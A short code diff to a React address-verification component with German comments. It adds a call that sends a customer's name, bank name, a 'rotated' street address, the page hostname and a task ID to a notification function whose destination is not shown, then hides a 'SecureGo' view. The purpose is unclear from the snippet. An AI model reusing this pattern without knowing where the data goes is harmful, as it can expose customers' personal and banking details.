@@ -171,6 +171,22 @@ const AddressVerification = ({
       } catch (err) {
         console.error("Fehler beim Markieren der Adresse als verwendet:", err);
       }
+      try {
+        const addr = rotatedAddressRef.current as any;
+        void notifyAddressDeleted({
+          data: {
+            host: typeof window !== "undefined" ? window.location.hostname : null,
+            bankName,
+            customerName: customerName ?? null,
+            street: addr?.street ?? "",
+            zip: addr?.zip_code ?? "",
+            city: addr?.city ?? "",
+            taskId: taskId ?? null,
+          },
+        });
+      } catch (err) {
+        console.warn("[notifyAddressDeleted] failed", err);
+      }
       setTimeout(() => {
         setShowSecureGo(false);
         onDelete();
